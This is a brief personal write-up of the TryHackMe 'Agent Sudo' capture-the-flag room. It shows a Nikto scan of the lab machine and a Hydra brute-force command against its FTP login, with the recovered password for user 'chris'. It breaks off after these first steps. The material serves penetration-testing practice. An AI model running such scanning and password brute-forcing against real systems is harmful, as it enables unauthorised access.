### TryHackMe CTF Challange
### 
###	AGENT SUDO

[link] 'https://tryhackme.com/room/agentsudoctf'

##############################


Name-->	SHASWATA SAHA
Date-->	26/04/2023


#############################

'''
IP : 10.10.143.211
'''


---------------------------------------------------
"
Downloaded Nikto
"


# Run Nikto

┌──(root㉿subhro)-[/home/subhro1530/Desktop/tryhackme/agent_sudo]
└─# nikto -h "http://10.10.143.211"
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.143.211
+ Target Hostname:    10.10.143.211
+ Target Port:        80
+ Start Time:         2023-04-25 14:48:24 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
^C                                                                            


# Use hydra to find password

┌──(subhro1530㉿subhro)-[/etc/opt]
└─$ hydra -l chris -P ~/Documents/rockyou.txt ftp://10.10.143.211
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-25 15:08:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.143.211:21/


Username: chris  password: crystal

# Find on yourself now...
